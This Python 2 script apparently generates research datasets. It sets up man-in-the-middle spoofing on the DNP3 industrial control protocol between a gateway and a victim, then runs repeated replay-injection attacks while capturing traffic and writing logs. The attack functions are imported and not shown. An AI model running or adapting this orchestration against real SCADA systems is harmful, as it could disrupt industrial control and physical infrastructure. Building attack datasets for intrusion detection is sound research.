__author__ = 'Nicholas Rodofile'

from attack_functions import *

local = "dataset/"

directory = local + str(datetime.now().strftime("%Y%m%d%H%M%S"))
os.makedirs(directory)
interfaces = {
    'attacker': "eth0",
    'master': "eth1",
    'slave': "eth2"
}
interface = interfaces['attacker']

attack_list = [
    #injection_replay,
    injection_replay_updater_ack,
]

gateway, victim, nodes = config_nodes_all(interface=interface, port="20000", init_nodes_func=init_dnp3_nodes)
mitm = DNP3_MITM(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)
mitm.init_spoofing()


count = 0
udp = UDP_Server(gateway, 23, 0)
udp_mask = Thread(target=udp.start)
udp_mask.daemon = True
udp_mask.start()

attack_class_dir = directory+"/"+"attackFramework"
os.makedirs(attack_class_dir)

experiment_name = "test"
dataset_manager = DatasetManager(attack_class_dir, interfaces, experiment_name)
dataset_manager.start()
# Randomise time
#reconnaissance(gateway, victim, nodes, mitm)
min_time = 15
max_time = 30
sleep_times = [0.5]
for time in sleep_times:
    print "TIME:", time
    for a in range(1, 10):
        print "sequence:", a
        for attack in attack_list:
            sleep_time = time
            attack_countdown(int(sleep_time * minute))
            run_attack(victim, gateway, attack)

dataset_manager.stop()
sub_log_file = attack_class_dir+"/Attack_script_log.log"
file = open(sub_log_file, 'w')
for l in sub_log:
    file.write(l + "\n")
file.close()
print "Sub-Log file:", sub_log_file
sub_log = []

UDP_SERVER_STOP = True
log_file = directory+"/Attack_script_log.log"
file = open(log_file, 'w')
for l in log:
    file.write(l + "\n")
file.close()

print "Log file:", log_file